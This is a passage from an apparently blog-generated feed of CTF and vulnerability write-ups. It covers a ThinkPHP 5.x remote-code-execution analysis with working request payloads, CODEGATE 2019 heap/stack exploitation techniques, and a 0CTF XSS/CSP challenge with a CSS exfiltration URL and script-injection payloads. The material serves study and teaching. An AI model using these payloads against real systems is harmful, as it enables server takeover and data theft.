&#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br></pre></td></tr></table></figure></p><p>python2和python3起服务虽然结果不同，但都能用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。&lt;br&gt;我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="flask" scheme="http://kctf.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.x-RCE分析</title>
    <link href="http://kctf.github.io/2019/02/01/thinkphp5-x-RCE/"/>
    <id>http://kctf.github.io/2019/02/01/thinkphp5-x-RCE/</id>
    <published>2019-02-01T13:03:28.000Z</published>
    <updated>2019-03-03T13:56:45.969Z</updated>
    
    <content type="html"><![CDATA[<h4 id="thinkphp5-0-22"><a href="#thinkphp5-0-22" class="headerlink" title="thinkphp5.0.22"></a>thinkphp5.0.22</h4><p>开debug模式,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.22/public/</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><a id="more"></a><p>关debug模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p>断点我直接下在了最后的RCE的地方,首先看一下调用堆栈</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzpot17mzxj30l40fejtm.jpg" alt></p><p>在这个调用堆栈里其实少了一个关键的一次调用,从<code>routeCheck</code>到<code>$method = strtolower($request-&gt;method());</code>这个地方,</p><p>先看一下这个地方</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzppfxxk0xj30y40d8dj4.jpg" alt></p><p>在<code>request.php</code>526行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure><p>在<code>think\config\app.php</code>中可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表单请求类型伪装变量</span><br><span class="line">&apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br></pre></td></tr></table></figure><p>那么我我们可以通过传递<code>_method</code>参数,然后进入<code>$this-&gt;{$this-&gt;method}($_POST);</code>调用Request类中的任意方法,<code>$_POST</code>就是传入的参数,也就是说可以实现任意方法任意参数的调用,继续看构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$options=&gt;$_POST</code>,然后判断类中是否有这个属性,如果有即赋值</p><p>继续往下走,通过<code>$data = *self*::exec($dispatch, $config);</code>,因为<code>type=method</code>进入到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'method'</span>: <span class="comment">// 回调方法</span></span><br><span class="line">    $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">    $data = <span class="keyword">self</span>::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>然后进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">    $method = $this-&gt;method(true);</span><br></pre></td></tr></table></figure><p>这里还是会进入到method方法,但是这次为true，进入的分支不同,然后进入到server方法,接着</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);</span><br></pre></td></tr></table></figure><p>进入到input方法,断点停在了<code>$this-&gt;filterValue($data, $name, $filter);</code>但是往上看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = $this-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><p>有个赋值的操作,跟进看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为一开始<code>filter</code>变量被我们覆盖成了<code>system</code>,所以没影响,最后进入到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure><p>但是到这里发现了问题,<code>$value</code>不对,想一下为什么不对,原因是我把断点下在了RCE的地方,但是呢第一次调用就停了,RCE的地方还得往下走,继续回到<code>param</code>方法,将当前请求参数和URL地址中的参数合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当前请求参数和URL地址中的参数合并</span><br><span class="line">$this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure><p>执行到最后再次进入input方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>这次<code>data</code>是数组,进入与刚才不一样的分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>array_walk_recursive</code>函数会对数组中的成员递归的调用<code>filterValue</code>,进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = call_user_func($filter, $value); //$filter:system  $value:whoami</span><br></pre></td></tr></table></figure><p>然后解释一下为什么路由要有<code>s=captcha</code>,<code>vendor/think-captcha/src/helper.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\think\Route::get(<span class="string">'captcha/[:id]'</span>, <span class="string">"\\think\\captcha\\CaptchaController@index"</span>);</span><br></pre></td></tr></table></figure><p>可以看到对应的路有信息,然后在route.php的1513-1519行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#125; elseif (false !== strpos($route, &apos;\\&apos;)) &#123;</span><br><span class="line">    // 路由到方法</span><br><span class="line">    list($path, $var) = self::parseUrlPath($route);</span><br><span class="line">    $route            = str_replace(&apos;/&apos;, &apos;@&apos;, implode(&apos;/&apos;, $path));</span><br><span class="line">    $method           = strpos($route, &apos;@&apos;) ? explode(&apos;@&apos;, $route) : $route;</span><br><span class="line">    $result           = [&apos;type&apos; =&gt; &apos;method&apos;, &apos;method&apos; =&gt; $method, &apos;var&apos; =&gt; $var];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到规则,因此type为mehod。</p><h4 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.5/public/</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;method=GET&amp;get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure><p>看下调用堆栈</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqwzllxivj30k60bejsz.jpg" alt></p><p>前面到调用Request类中的任意方法的过程是一样的,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filter[]=assert</span><br><span class="line">get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure><p>因为默认开着debug,进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (self::$debug) &#123;</span><br><span class="line">    Log::record(&apos;[ ROUTE ] &apos; . var_export($dispatch, true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ HEADER ] &apos; . var_export($request-&gt;header(), true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ PARAM ] &apos; . var_export($request-&gt;param(), true), &apos;info&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$request-&gt;param</code>中,然后到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = array_merge(<span class="keyword">$this</span>-&gt;param, $file);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为上面请求了method为GET,那么会先将参数合并,然后进入input</p><p>这里因为上面赋值操作也让<code>get</code>为<code>system(&#39;whoami&#39;)</code>,</p><p>继续进入input中</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqyaqlxx1j314k0hkgp9.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;thinkphp5-0-22&quot;&gt;&lt;a href=&quot;#thinkphp5-0-22&quot; class=&quot;headerlink&quot; title=&quot;thinkphp5.0.22&quot;&gt;&lt;/a&gt;thinkphp5.0.22&lt;/h4&gt;&lt;p&gt;开debug模式,&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://127.0.0.1:10080/thinkphp_5.0.22/public/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="代码审计" scheme="http://kctf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CODEGATE 2019 PWN writeup</title>
    <link href="http://kctf.github.io/2019/01/27/CODEGATE-2019-PWN-writeup/"/>
    <id>http://kctf.github.io/2019/01/27/CODEGATE-2019-PWN-writeup/</id>
    <published>2019-01-27T12:06:00.000Z</published>
    <updated>2019-03-03T13:56:45.968Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>STILL LOVE PWN AND EXPLOIT</em></strong></p><h2 id="aeiou"><a href="#aeiou" class="headerlink" title="aeiou"></a>aeiou</h2><h3 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h3><p>It seems like a heap problem, but there is no loop in main function. We can only do action on time. When look into the programe, I find that there is a stack overflow in teach number function which address is 0x4013aa. The buff is only 0x1000, but we can input 0x10000. Obviously, it is a stack overflow vuln.</p><a id="more"></a><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>How to get the shell? First, check the security mechanism:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p><p>As we can see, the canary is opened. We can’t just overwrite the return address directly, for there is the canary protection. </p><p>How to figure out the problem? Back to the programe, i find that the function is in a thread which is made by <code>pthread_create</code>. It is a little wired, i think it may be the key. </p><p>After searching in the internet, i found a technique to bypass canary. when a thread is created by <code>pthread_create</code> function, to ensure the thread has its own stack, process will use <code>TLS</code> to store the variable and things. So the <code>stack</code> is belonged to thread itself(<code>TLS</code>), and is created by <code>mmap</code> function. Canary is also under the stack,which is the <code>stack_guard</code> in the <code>tcbhead_t</code>struct.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></p><p>So the way we bypass the canary is that we input long buff and it will finaly overwrite the canary. With this way, we can do ROP attack easily. The full exp link is shown at the bottom.</p><h2 id="god-the-reum"><a href="#god-the-reum" class="headerlink" title="god-the-reum"></a>god-the-reum</h2><h3 id="vuln-1"><a href="#vuln-1" class="headerlink" title="vuln"></a>vuln</h3><p>the vuln is obvious, which is a <code>uaf</code> in <code>withdraw</code> function in <code>0xF2E</code>. The funtion free the heap pointer but does not clean the value of pointer, we can still use the pointer to do anything such as leaking.</p><h3 id="expolit"><a href="#expolit" class="headerlink" title="expolit"></a>expolit</h3><p>first, check the security mechanism:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p><p>one thing we need to care is that this programe is run under the <code>libc 2.27</code>, which os is ubuntu 18.4. there is <code>tcache</code> in <code>libc 2.27</code>.</p><p>next, we need to leak heap address, we can use <code>withdraw</code> funtion to free a chunk to <code>tcache</code>, and then use <code>uaf</code> vuln (<code>withdraw</code> again) to free the same chunk(there is no check in <code>tcache</code>), then we can use <code>show</code> to leak the address of heap.</p><p>How to leak libc address? after leak the heap address, we can know the money we need to substract, so we can free the same chunk 7 times and the chunk will be put into <code>unsorted bin</code>. Then we can use <code>show</code> function to leak the libc address.</p><p>Now we get all the address we need, so we can use <code>developer</code> function to overwrite the tcache chain to get the memory which address is <code>__free_hook</code>, then we write <code>one gadget</code> address into <code>__free_hook</code>. </p><p>Finally, get the shell.</p><h2 id="maris-shop"><a href="#maris-shop" class="headerlink" title="maris_shop"></a>maris_shop</h2><h3 id="vuln-2"><a href="#vuln-2" class="headerlink" title="vuln"></a>vuln</h3><p>There is a <code>uaf</code> vuln. We can first create 16 carts. And when we buy all the carts, it will free all the carts but just set 15 carts pointer and leave the last ont unclean. That’s the pointer we can use to leak address and exploit.</p><h3 id="expolit-1"><a href="#expolit-1" class="headerlink" title="expolit"></a>expolit</h3><p>first, check the security mechanism:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p><p>There is a small trick to bypass <code>money check</code>, which is we can use <code>0 amount</code>.</p><p>The whole process is shown as below:</p><ol><li>we create 16 carts. </li><li>we by all the carts, the programe will free all the pointer and leave the 15th pointer unclean. </li><li>we show the 15th pointer and leak the address of libc.</li><li>we add the 15th carts and make unsorted bin attack, which overwrite <code>stdin-&gt;_IO_buf_end</code> to point to <code>main_arena</code>.</li><li>we call fgets will overwrite the <code>stdin-&gt;vtable</code>, address of which  contains <code>one gadgets</code> .</li><li>get shell</li></ol><h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>all the exp is in my <a href="https://github.com/ray-cp/ctf-pwn/tree/master/codegate2019" target="_blank" rel="noopener">github</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;em&gt;STILL LOVE PWN AND EXPLOIT&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;aeiou&quot;&gt;&lt;a href=&quot;#aeiou&quot; class=&quot;headerlink&quot; title=&quot;aeiou&quot;&gt;&lt;/a&gt;aeiou&lt;/h2&gt;&lt;h3 id=&quot;vuln&quot;&gt;&lt;a href=&quot;#vuln&quot; class=&quot;headerlink&quot; title=&quot;vuln&quot;&gt;&lt;/a&gt;vuln&lt;/h3&gt;&lt;p&gt;It seems like a heap problem, but there is no loop in main function. We can only do action on time. When look into the programe, I find that there is a stack overflow in teach number function which address is 0x4013aa. The buff is only 0x1000, but we can input 0x10000. Obviously, it is a stack overflow vuln.&lt;/p&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://kctf.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://kctf.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="http://kctf.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018 0CTF final h4x0rs.date</title>
    <link href="http://kctf.github.io/2018/06/03/2018-0CTF-final-h4x0rs-date/"/>
    <id>http://kctf.github.io/2018/06/03/2018-0CTF-final-h4x0rs-date/</id>
    <published>2018-06-03T09:26:42.000Z</published>
    <updated>2019-03-03T13:56:45.967Z</updated>
    
    <content type="html"><![CDATA[<p>当时比赛时，差一点就解出来了。结束前半小时，才发觉获取nonce的漏洞点。</p><p>还是太菜了，否则能一跃第四。</p><p>这题其实挺有意思的， 赛后仔细想想，好像也不是太难。但是题目真心不错。</p><p>最后证实，这题有多种解法，但每一种解法，都感觉学到了很多。</p><p>题目链接：<a href="https://h4x0rs.date/" target="_blank" rel="noopener">https://h4x0rs.date/</a></p><a id="more"></a><p>由于这篇题解自己拖得时间有点长了，所以刚刚发现 lorexxar大佬的题解写的很棒了，大家可以看一下，我就不过多介绍题目了。而且我尽量写一些与他不同的。</p><p><a href="https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data" target="_blank" rel="noopener">https://www.lorexxar.cn/2018/05/31/0ctf2018-final/#h4x0rs-data</a></p><h2 id="获取ID"><a href="#获取ID" class="headerlink" title="获取ID"></a>获取ID</h2><p>我们是通过一个比较简单的方式获取到的id。题目中存在一个id为msg标签可写内容。此时我们将自己资料改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">msg</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造链接report即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://h4x0rs.date/login.php?redict=profile.php?id=&#123;you_id&#125;%26msg=body&#123;background-img:url('//eval.com?id=</span><br></pre></td></tr></table></figure><h2 id="【非预期】通过iframe控制csp"><a href="#【非预期】通过iframe控制csp" class="headerlink" title="【非预期】通过iframe控制csp"></a>【非预期】通过iframe控制csp</h2><p>这个解法是刷出题人Twitter刷到的。</p><p><img src="http://img.5am3.com/img/180531/HdEkFhl6GE.png" alt="mark"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>因为题目本身是通过加载js，来实现csp的加载。此时csp是直接写到内容中的。可以影响到此标签后面的js的加载。（前面的无法影响）</p><p>所以，此时我们只要能提前想办法不让这个js加载即可。当时自己也是想过的，然而……没办法。</p><p>在这里，这位大佬用了iframe标签的csp属性。（貌似只有chrome可以用）</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>此时我们先构造user1的资料为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再构造user2的资料为如下，从而加载恶意代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">/profile.php?id</span>=<span class="string">user1_ID</span> <span 